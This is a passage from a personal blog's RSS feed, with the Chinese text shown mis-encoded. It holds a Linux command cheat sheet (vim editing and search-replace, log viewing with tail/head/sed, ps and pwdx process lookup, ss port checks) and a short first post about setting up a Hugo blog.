<li>æŒ‰<code>O</code>è¿›å…¥ç¼–è¾‘æ¨¡å¼åï¼Œä¼šåœ¨å½“å‰è¡Œä¸Šä¸€è¡Œæ–°å¼€ä¸€è¡Œ</li>
</ul>
<p><code>æˆ‘ç”¨çš„æœ€å¤šçš„æ˜¯i</code></p>
<h3 id="é€€å‡ºç¼–è¾‘æ¨¡å¼">é€€å‡ºç¼–è¾‘æ¨¡å¼</h3>
<ul>
<li>æŒ‰<code>ESC</code>é€€å‡ºç¼–è¾‘æ¨¡å¼</li>
</ul>
<h3 id="æŸ¥æ‰¾">æŸ¥æ‰¾</h3>
<ul>
<li>ä½¿ç”¨ï¼š<code>/è¦æŸ¥æ‰¾çš„å†…å®¹</code></li>
<li>ä½¿ç”¨<code>vim /æ–‡ä»¶å</code>æ‰“å¼€æ–‡ä»¶åï¼Œè¾“å…¥<code>/</code>è¦æŸ¥æ‰¾çš„å†…å®¹å³å¯ï¼Œæ¯”å¦‚ä¸‹é¢æˆ‘è¦åœ¨<code>redis.conf</code>é…ç½®æ–‡ä»¶ä¸­æŸ¥æ‰¾<code>bind</code>å…³é”®å­—</li>
</ul>
<a class="lightgallery" href="/img/image-20210410145934938.png" title="/img/image-20210410145934938.png" data-thumbnail="/img/image-20210410145934938.png">
        
    </a>
<ul>
<li>
<p>ç„¶åå¯ä»¥è¾“å…¥å›è½¦ï¼Œä¼šæŸ¥æ‰¾åˆ°è¯¥æ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ª<code>bind</code>ï¼Œå¯ä»¥è¾“å…¥<code>n</code>å®šä½åˆ°ä¸‹ä¸€ä¸ªï¼Œè¾“å…¥<code>N</code>å®šä½åˆ°ä¸Šä¸€ä¸ª</p>
</li>
<li>
<p>å–æ¶ˆé«˜äº®å¯ä»¥è¾“å…¥<code>nohlsearch</code>ï¼Œç®€å†™ä¸º<code>noh</code>ï¼Œä¹Ÿå¯ä»¥è¾“å…¥<code>set nohlsearch</code> ï¼Œç®€å†™ä¸º<code>set noh</code></p>
</li>
</ul>
<h3 id="æ›¿æ¢">æ›¿æ¢</h3>
<ul>
<li>
<p>æŠŠæ–‡ä»¶ä¸­çš„æ‰€æœ‰<code>127.0.0.1</code>æ›¿æ¢ä¸º<code>120.5.5.153</code></p>
<ul>
<li>ä½¿ç”¨ï¼š<code>:%s/127.0.0.1/120.5.5.153/g</code></li>
</ul>
</li>
<li>
<p>æŠŠå½“å‰è¡Œçš„<code>127.0.0.1</code>æ›¿æ¢ä¸º<code>120.5.5.153</code></p>
<ul>
<li>ä½¿ç”¨ï¼š<code>:S/127.0.0.1/120.5.5.153/g</code></li>
</ul>
</li>
</ul>
<p><code>è¿˜æœ‰å¾ˆå¤šæ›¿æ¢ç›¸å…³çš„å‘½ä»¤ï¼Œè¿™é‡Œåªæ˜¯å†™äº†å¸¸ç”¨çš„</code></p>
<h3 id="é€€å‡º">é€€å‡º</h3>
<ul>
<li>é€€å‡ºä¸ä¿å­˜<code>:q</code></li>
<li>å¼ºåˆ¶é€€å‡ºä¸ä¿å­˜<code>:q!</code></li>
<li>ä¿å­˜å¹¶é€€å‡º<code>:wq</code></li>
<li>å¼ºåˆ¶ä¿å­˜å¹¶é€€å‡º<code>:wq!</code></li>
</ul>
<h2 id="æŸ¥çœ‹æ—¥å¿—">æŸ¥çœ‹æ—¥å¿—</h2>
<h3 id="å®æ—¶åˆ·æ–°æŸ¥çœ‹æ—¥å¿—">å®æ—¶åˆ·æ–°æŸ¥çœ‹æ—¥å¿—</h3>
<ul>
<li>æ–¹å¼ä¸€ï¼šä½¿ç”¨ï¼š<code>tail -f -n 10 æ—¥å¿—æ–‡ä»¶åç§°</code>
<ul>
<li><code>-f</code>ï¼šå®æ—¶åˆ·æ–°</li>
<li><code>-n</code>ï¼šè¡Œæ•°å…³é”®å­—ï¼Œåé¢è·Ÿè¡Œæ•°ï¼Œè¡¨ç¤ºä»å10è¡Œå¼€å§‹æŸ¥çœ‹</li>
</ul>
</li>
<li>æ–¹å¼äºŒï¼šä½¿ç”¨ï¼š<code>tailf æ—¥å¿—æ–‡ä»¶åç§°</code>
<ul>
<li>é»˜è®¤ä»ååè¡Œå¼€å§‹æŸ¥çœ‹</li>
</ul>
</li>
</ul>
<h3 id="æŸ¥çœ‹æ—¥å¿—å‰10è¡Œ">æŸ¥çœ‹æ—¥å¿—å‰10è¡Œ</h3>
<ul>
<li>ä½¿ç”¨ï¼š<code>head -n è¡Œæ•° æ—¥å¿—æ–‡ä»¶åç§°</code>
<ul>
<li><code>-n</code> ï¼šè¡Œæ•°å…³é”®å­—</li>
</ul>
</li>
</ul>
<h3 id="æŸ¥çœ‹ç¬¬10è¡Œåˆ°ç¬¬20è¡Œ">æŸ¥çœ‹ç¬¬10è¡Œåˆ°ç¬¬20è¡Œ</h3>
<ul>
<li>æ–¹å¼ä¸€ï¼šä½¿ç”¨ï¼š<code>sed -n '10,20p' æ—¥å¿—æ–‡ä»¶åç§°</code>
<ul>
<li><code>-n</code>ï¼šæ‰“å°åˆ¶å®šè¡Œ</li>
<li><code>'10,20p'</code>ï¼šæŒ‡å®šçš„è¡Œå·</li>
</ul>
</li>
<li>æ–¹å¼äºŒï¼šä½¿ç”¨ï¼š<code>cat -n æ—¥å¿—æ–‡ä»¶åç§° | head -n 20 | tail -n +10</code>
<ul>
<li><code>cat -n</code>ï¼šæ‰“å°æ—¥å¿—æ˜¾ç¤ºè¡Œå·</li>
<li><code>head -n 20</code>ï¼šæ‰“å°åˆ°20è¡Œ</li>
<li><code>tail -n +10</code>ï¼šä»ç¬¬10è¡Œå¼€å§‹æ‰“å°</li>
</ul>
</li>
</ul>
<p>2021.04.20</p>
<h2 id="æŸ¥çœ‹è¿›ç¨‹">æŸ¥çœ‹è¿›ç¨‹</h2>
<h3 id="pså‘½ä»¤">pså‘½ä»¤</h3>
<p>ps ï¼ˆè‹±æ–‡å…¨æ‹¼ï¼šprocess statusï¼‰å‘½ä»¤ç”¨äºæ˜¾ç¤ºå½“å‰è¿›ç¨‹çš„çŠ¶æ€ &ndash;æ‘˜è‡ªèœé¸Ÿæ•™ç¨‹</p>
<h4 id="å‚æ•°">å‚æ•°</h4>
<ul>
<li>-aï¼šåˆ—å‡ºæ‰€æœ‰è¿›ç¨‹</li>
<li>-wï¼šæ˜¾ç¤ºåŠ å®½ï¼Œå¯ä»¥æ˜¾ç¤ºæ›´å¤šå†…å®¹</li>
<li>-uï¼šä»¥ç”¨æˆ·ä¸ºä¸»çš„è¿›ç¨‹çŠ¶æ€</li>
<li>-xï¼šæ˜¾ç¤ºå½“å‰ç”¨æˆ·åœ¨æ‰€æœ‰ç»ˆç«¯ä¸‹çš„è¿›ç¨‹ä¿¡æ¯ï¼Œé€šå¸¸å’Œå‚æ•°<code>a</code>ä¸€èµ·ä½¿ç”¨</li>
<li>-eï¼šæ˜¾ç¤ºç³»ç»Ÿå†…æ‰€æœ‰çš„è¿›ç¨‹ä¿¡æ¯</li>
<li>-lï¼šä½¿ç”¨é•¿æ ¼å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯</li>
<li>-fï¼šä½¿ç”¨å®Œæ•´çš„æ ¼å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯</li>
</ul>
<h4 id="ç­›é€‰">ç­›é€‰</h4>
<ul>
<li>åœ¨è¾“å…¥äº†ä¸Šé¢å‘½ä»¤åæ·»åŠ <code>|grep processName/processID</code></li>
<li><code>ps -aux |grep mysql</code></li>
</ul>
<h3 id="æ ¹æ®è¿›ç¨‹æŸ¥æ‰¾æ–‡ä»¶">æ ¹æ®è¿›ç¨‹æŸ¥æ‰¾æ–‡ä»¶</h3>
<ul>
<li>
<p>å½“å› ä¸ºæŸç§åŸå› æ‰¾ä¸åˆ°æœåŠ¡çš„å­˜æ”¾ä½ç½®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤å…ˆæŸ¥çœ‹è¿›ç¨‹çš„ID</p>
</li>
<li>
<p>ç„¶åä½¿ç”¨å‘½ä»¤ï¼š<code>pwdx processID</code>å‘½ä»¤æŸ¥æ‰¾è¯¥è¿›ç¨‹æ–‡ä»¶å­˜æ”¾çš„ä½ç½®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>root@rabbitmq1 redis<span class="o">]</span><span class="c1"># ps -aux |grep redis</span>
redis     <span class="m">4356</span>  0.1  2.3 <span class="m">323184</span> <span class="m">133272</span> ?       Ssl  4æœˆ19  25:12 /usr/bin/redis-server *:6379
root      <span class="m">7194</span>  0.0  0.0 <span class="m">112736</span>   <span class="m">996</span> pts/1    S+   11:23   0:00 grep --color<span class="o">=</span>auto redis
<span class="o">[</span>root@rabbitmq1 redis<span class="o">]</span><span class="c1"># pwdx 4356</span>
4356: /var/lib/redis
</code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="æŸ¥çœ‹ç«¯å£å·æ˜¯å¦è¢«ç›‘å¬">æŸ¥çœ‹ç«¯å£å·æ˜¯å¦è¢«ç›‘å¬</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>root@pacs local<span class="o">]</span><span class="c1"># ss -tunlp |grep 3306</span>
tcp    LISTEN     <span class="m">0</span>      <span class="m">128</span>       *:3306      *:*    users:<span class="o">((</span><span class="s2">&#34;docker-proxy&#34;</span>,pid<span class="o">=</span>28320,fd<span class="o">=</span>4<span class="o">))</span>
</code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>ç¬¬ä¸€ç¯‡æ–‡ç« </title>
    <link>https://testoai.github.io/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</link>
    <pubDate>Sun, 04 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>ä½œè€…</author>
    <guid>https://testoai.github.io/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</guid>
    <description><![CDATA[<h1 id="ç¬¬ä¸€ç¯‡æ–‡ç« ">ç¬¬ä¸€ç¯‡æ–‡ç« </h1>
<p>å†™ç‚¹å„¿å•¥å‘¢</p>
<p>è¿™ä¸¤å¤©ä¸€ç›´åœ¨å¼„åšå®¢ï¼Œæ˜¨å¤©å¼„äº†ä¸€å¤©iconï¼Œ</p>
<p>hugoçš„æ–‡æ¡£æœ‰ç‚¹å„¿å¤šï¼Œæ²¡æ‰¾åˆ°config.tomlçš„è¯´æ˜æ–‡æ¡£ [æ‰‹åŠ¨ç¬‘å“­]</p>
<p>æœ€åå„ç§Googleï¼Œæ˜¨æ™šç»ˆäºå¼„å¥½äº†</p>
<p>å…¶å®æ˜¨å¤©ä¸€ç›´è¾¹ç©å„¿è¾¹æï¼Œåœ¨å®¶å¼„æ•ˆç‡æ˜¯ä¸å¤ªé«˜ ^_^</p>
<p>ä½†æ˜¯è¿™ä¸ªä¸ºå•¥ä¸å…¼å®¹markdownçš„è¡¨æƒ… ToT</p>
<p>ä»Šå¤©æ˜¯æ¸…æ˜èŠ‚ï¼Œæœ¬æ¥æ‰“ç®—å›å®¶&hellip;ï¼Œæ”¹åˆ°äº”ä¸€å‡æœŸå†å›å§</p>
<p>ç¥è‡ªä¸ªå„¿ä¸‹å‘¨äºŒé¡ºåˆ©å§</p>
<p>å¼€å§‹å­¦ä¹ &hellip;</p>
]]></description>
</item></channel>
</rss>
